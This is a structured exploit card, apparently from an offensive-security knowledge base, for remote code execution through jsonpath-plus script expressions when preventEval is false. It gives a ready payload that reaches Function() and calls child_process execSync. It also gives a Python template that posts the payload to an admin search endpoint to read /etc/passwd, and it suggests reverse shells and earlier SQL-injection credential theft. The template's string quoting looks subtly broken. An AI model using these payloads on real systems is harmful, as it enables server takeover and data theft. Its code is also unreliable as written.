---
name: jsonpath_plus_preventeval_rce
vuln_type: rce
sub_technique: jsonpath_injection
category: exploitation
safety_level: safe
---

# Jsonpath-Plus Preventeval:False Allows Javascript Code Execution Via Script Expressions

## When to Apply

A Node.js application uses the `jsonpath-plus` library to evaluate user-supplied JSONPath expressions with `preventEval: false` (or the option is omitted, as it defaults to false). The JSONPath-plus library supports script expressions `?(...)` that are compiled into JavaScript and executed via `Function()` constructor. An attacker can craft a JSONPath expression that escapes the intended JSON query context and executes arbitrary JavaScript, including accessing `process.mainModule.require('child_process')` for OS command execution. The endpoint may be restricted (e.g., admin-only), requiring a prior authentication bypass or privilege escalation.

## Prerequisites

- jsonpath-plus library used server-side in Node.js
- preventEval is false (default) or explicitly set to false
- User-controlled jsonPath expression reaches JSONPath() call
- Endpoint accessible (directly or after auth bypass / privilege escalation)

## Steps

1. Identify endpoint that accepts a JSONPath expression (e.g., admin search API)\n2. Confirm jsonpath-plus usage with preventEval: false (source code or behavior)\n3. Craft RCE payload using script expression:\n   `$..[?(p="this.process.mainModule.require('child_process').execSync('id')";`\n   `test=''[['constructor']][['constructor']](p);test())]`\n4. Send payload as the jsonPath parameter to the vulnerable endpoint\n5. The `Function()` constructor compiles and executes the injected JavaScript\n6. Use RCE to read files, establish reverse shell, or pivot to other services

## Code Template

```
import requests\ns = requests.Session()\n# Authenticate first (e.g., admin login)\ns.headers['Authorization'] = f'Bearer {token}'\n\npayload = {\n    'jsonPath': '$..[?(p="this.process.mainModule.require(\"child_process\")'.execSync(\"cat /etc/passwd\").toString()";'test=\"\"[[\"constructor\"]][[\"constructor\"]](p);test())]',\n    'searchTerm': ''\n}\nr = s.post(f'{URL}/api/admin/resumes/search', json=payload)\nprint(r.text)
```

## Examples

### Example 1

- **library**: jsonpath-plus (npm)
- **vulnerable_option**: preventEval: false
- **execution_mechanism**: Function() constructor via script expression ?(…)
- **payload_pattern**: $..[?(p="this.process.mainModule.require('child_process').execSync('cmd')";test=''[['constructor']][['constructor']](p);test())]
- **requires_auth**: Admin role JWT required (obtained via prior SQLi credential extraction)

The jsonpath-plus library's script expression feature compiles user-supplied expressions into JavaScript code using the Function() constructor. When preventEval is false (the default), there is no sandboxing or restriction on what code can be executed. The technique uses ''[['constructor']][['constructor']] to reach the Function constructor from a string literal, bypassing simple keyword filters. This is a well-known prototype chain trick for accessing Function() from any JavaScript object.
